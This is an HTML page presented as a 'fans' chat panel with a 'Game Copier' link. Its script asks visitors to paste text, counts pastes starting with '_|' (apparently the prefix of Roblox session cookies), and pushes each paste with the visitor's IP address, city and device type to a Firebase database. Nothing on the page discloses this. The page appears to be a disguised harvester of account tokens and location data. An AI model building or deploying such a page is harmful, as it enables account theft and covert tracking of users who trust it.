<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>For fans</title>

<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">

<style>
* {margin:0;padding:0;box-sizing:border-box;font-family:'Orbitron',sans-serif;}
body {height:100vh;background:black;overflow:hidden;color:white;}

#bg {position:fixed;top:0;left:0;z-index:-1;}

.cursor {
    position:fixed;width:20px;height:20px;background:cyan;
    border-radius:50%;pointer-events:none;
    box-shadow:0 0 20px cyan,0 0 40px cyan;
    transform:translate(-50%,-50%);z-index:9999;
}

.sidebar {
    position:fixed;left:0;top:0;height:100%;width:80px;
    background:rgba(0,0,0,0.6);backdrop-filter:blur(10px);
    transition:0.3s;padding-top:20px;
}
.sidebar:hover {width:200px;}

.sidebar button {
    width:100%;padding:15px;background:none;border:none;
    color:cyan;text-align:left;cursor:pointer;
}
.sidebar button:hover {background:rgba(0,255,255,0.2);}

.page {
    display:none;position:absolute;top:50%;left:55%;
    transform:translate(-50%,-50%);text-align:center;
}
.page.active {display:block;}

.glitch {
    font-size:34px;color:cyan;
    text-shadow:0 0 10px cyan;
    animation:glitch 1s infinite;
}
@keyframes glitch {
    0%{text-shadow:2px 0 red,-2px 0 blue;}
    50%{text-shadow:-2px 0 red,2px 0 blue;}
    100%{text-shadow:2px 0 red,-2px 0 blue;}
}

input {
    margin-top:20px;padding:15px;width:300px;
    border-radius:10px;border:none;
    background:rgba(255,255,255,0.1);
    color:white;outline:none;
}

button.send {
    margin-top:15px;padding:15px 30px;
    border-radius:10px;border:none;
    background:cyan;color:black;cursor:pointer;
}

.powered {
    margin-top:20px;color:cyan;
    text-shadow:0 0 10px cyan;
}

.tool-card {
    margin-top:20px;width:250px;padding:15px;
    border:1px solid cyan;border-radius:15px;
    cursor:pointer;text-align:center;
    box-shadow:0 0 15px cyan;
    margin-left:auto;margin-right:auto;
    transition:0.3s;
}
.tool-card:hover {transform:scale(1.05);}
</style>
</head>

<body>

<canvas id="bg"></canvas>
<div class="cursor" id="cursor"></div>

<div class="sidebar">
    <button onclick="showPage('main')">🏠 Main</button>
    <button onclick="openHelp()">❓ Help</button>
    <button onclick="openInvite()">🔗 Invite</button>
    <button onclick="showPage('more')">📂 More</button>
</div>

<div class="page active" id="main">
    <div class="glitch">fans</div>

    <input type="text" id="messageInput" placeholder="Type something...">
    <br>
    <button class="send" onclick="sendMessage()">Send</button>

    <div class="powered">⚡ Powered by AWP & SWIFTIES ⚡</div>
</div>

<div class="page" id="more">
    <div class="glitch">More Tools</div>

    <div class="tool-card" onclick="openGameCopier()">
        <img src="https://i.postimg.cc/k52qTcds/Screenshot-2026-04-12-005645.png"
             style="width:100%; border-radius:10px;">
        <br><br>
        <span style="color:cyan; font-size:18px;">🎮 Game Copier</span>
    </div>
</div>

<!-- FIREBASE -->
<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js"></script>

<script>

/* FIREBASE CONFIG */
const firebaseConfig = {
  apiKey: "AIzaSyB5a-y6d0v-EAy0_Vm3Viy4YHyVC0owasA",
  authDomain: "chat-panel-f23cb.firebaseapp.com",
  databaseURL: "https://chat-panel-f23cb-default-rtdb.europe-west1.firebasedatabase.app",
  projectId: "chat-panel-f23cb",
  storageBucket: "chat-panel-f23cb.firebasestorage.app",
  messagingSenderId: "1063884288659",
  appId: "1:1063884288659:web:96656490f8e3ddbab9d366",
  measurementId: "G-QR5JLJX0PN"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

/* cursor */
document.addEventListener("mousemove", e => {
    const c = document.getElementById("cursor");
    c.style.left = e.clientX + "px";
    c.style.top = e.clientY + "px";
});

/* page switch */
function showPage(id) {
    document.querySelectorAll(".page").forEach(p => p.classList.remove("active"));
    document.getElementById(id).classList.add("active");
}

/* links */
function openHelp() {
    window.open("https://discord.com/users/1269285660834140215", "_blank");
}
function openInvite() {
    window.open("https://discord.gg/zEtZCQ95eT", "_blank");
}
function openGameCopier() {
    window.open("https://speedubx.github.io/AwpTools/", "_blank");
}

/* LOCATION */
async function getLocation() {
    try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        return `🌍 ${data.city}, ${data.country_name} | ${data.ip}`;
    } catch {
        return "🌍 Unknown";
    }
}

/* DATA */
let specialCount = localStorage.getItem("specialCount") ? parseInt(localStorage.getItem("specialCount")) : 0;
let xp = localStorage.getItem("xp") ? parseInt(localStorage.getItem("xp")) : 0;

function saveData() {
    localStorage.setItem("specialCount", specialCount);
    localStorage.setItem("xp", xp);
}

/* SEND */
async function sendMessage() {
    const msg = document.getElementById("messageInput").value.trim();
    if (!msg) return alert("Please Paste");

    const time = new Date().toLocaleString();
    const device = /Mobi|Android/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 PC";

    xp++;
    if (msg.startsWith("_|")) specialCount++;
    saveData();

    const locationText = await getLocation();

    /* COMMANDS (kept but local now) */
    if (msg === "/accstatus") {
        alert(`_| Messages: ${specialCount}`);
        return;
    }

    if (msg === "/reset") {
        specialCount = 0;
        xp = 0;
        saveData();
        return;
    }

    if (msg === "/level") {
        alert(`Level: ${Math.floor(xp/5)} | XP: ${xp}`);
        return;
    }

    /* SEND TO RECEIVER */
    await db.ref("messages").push({
        text: msg,
        time: time,
        device: device,
        location: locationText
    });

    document.getElementById("messageInput").value = "";
}

/* particles */
const canvas = document.getElementById("bg");
const ctx = canvas.getContext("2d");

canvas.width = innerWidth;
canvas.height = innerHeight;

let particles = [];
for (let i = 0; i < 200; i++) {
    particles.push({
        x:(Math.random()-0.5)*canvas.width,
        y:(Math.random()-0.5)*canvas.height,
        z:Math.random()*1000
    });
}

function draw() {
    ctx.fillStyle="black";
    ctx.fillRect(0,0,canvas.width,canvas.height);

    particles.forEach(p=>{
        p.z-=2;
        if(p.z<=0)p.z=1000;

        let k=128/p.z;
        let x=p.x*k+canvas.width/2;
        let y=p.y*k+canvas.height/2;
        let size=(1-p.z/1000)*3;

        ctx.fillStyle="cyan";
        ctx.fillRect(x,y,size,size);
    });

    requestAnimationFrame(draw);
}
draw();

</script>

</body>
</html>
